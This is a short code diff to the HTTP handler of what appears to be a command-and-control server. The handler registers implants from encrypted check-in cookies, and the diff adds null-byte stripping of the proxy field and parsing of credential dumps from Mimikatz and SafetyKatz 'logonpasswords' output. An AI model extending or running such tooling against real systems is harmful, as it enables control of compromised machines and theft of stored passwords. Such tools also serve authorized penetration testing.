@@ -255,6 +255,7 @@ class MyHandler(BaseHTTPRequestHandler):
                 decCookie = decrypt(KEY, cookieVal)
                 IPAddress = "%s:%s" % (s.client_address[0], s.client_address[1])
                 Domain, User, Hostname, Arch, PID, Proxy = decCookie.split(";")
+                Proxy = Proxy.replace("\x00", "")
                 if "\\" in User:
                     User = User[User.index("\\") + 1:]
                 newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
@@ -271,6 +272,7 @@ class MyHandler(BaseHTTPRequestHandler):
                 decCookie = decrypt(KEY, cookieVal)
                 IPAddress = "%s:%s" % (s.client_address[0], s.client_address[1])
                 User, Domain, Hostname, Arch, PID, Proxy = decCookie.split(";")
+                Proxy = Proxy.replace("\x00", "")
                 newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
                 newImplant.save()
                 newImplant.display()
@@ -286,6 +288,7 @@ class MyHandler(BaseHTTPRequestHandler):
                     decCookie = decrypt(KEY.encode("utf-8"), cookieVal)
                     decCookie = str(decCookie)
                     Domain, User, Hostname, Arch, PID, Proxy = decCookie.split(";")
+                    Proxy = Proxy.replace("\x00", "")
                     IPAddress = "%s:%s" % (s.client_address[0], s.client_address[1])
                     if "\\" in str(User):
                         User = User[str(User).index('\\') + 1:]
@@ -454,7 +457,7 @@ class MyHandler(BaseHTTPRequestHandler):
                             update_task(taskId, message)
                             print(message)
 
-                    elif executedCmd.lower().startswith("invoke-mimikatz") and "logonpasswords" in outputParsed:
+                    elif (executedCmd.lower().startswith("run-exe safetykatz") or executedCmd.lower().startswith("invoke-mimikatz")) and "logonpasswords" in outputParsed.lower():
                         print("Parsing Mimikatz Output")
                         process_mimikatz(outputParsed)
                         update_task(taskId, outputParsed)
